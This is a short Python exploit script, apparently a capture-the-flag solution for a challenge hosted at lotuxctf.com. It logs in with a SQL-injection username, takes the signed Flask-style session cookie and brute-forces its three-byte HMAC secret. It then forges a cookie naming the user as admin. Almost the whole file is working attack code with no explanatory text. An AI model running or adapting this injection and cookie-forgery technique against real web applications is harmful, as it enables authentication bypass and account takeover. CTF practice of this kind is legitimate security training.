import requests as req
from itertools import product
from itsdangerous import base64_decode, base64_encode
from tqdm import tqdm
import hashlib, hmac

# waiting for analysis!!

def gen_session_hmac(pre_session: bytes, secret_key: bytes):
    key = hmac.new(secret_key, msg=b'cookie-session', digestmod=hashlib.sha1).digest()
    return hmac.new(key, msg=pre_session, digestmod=hashlib.sha1).digest()

session = req.post('http://lotuxctf.com:20002/login', data={'username': "curious' -- ", 'password': '123'}, allow_redirects=False).headers['Set-Cookie'].split(';')[0].split('=')[1].encode().split(b'.')

pre_session = session[0] + b'.' + session[1]
right_hmac = base64_decode(session[2])

for new_key in tqdm(product(range(256), repeat=3)):
    new_key = bytes(new_key)
    if gen_session_hmac(pre_session, new_key) == right_hmac:
        secret_key = new_key
        break

new_pre_session = base64_encode('{"username":"admin"}') + b'.' + session[1]
session = new_pre_session + b'.' + base64_encode(gen_session_hmac(new_pre_session, secret_key))

print(session)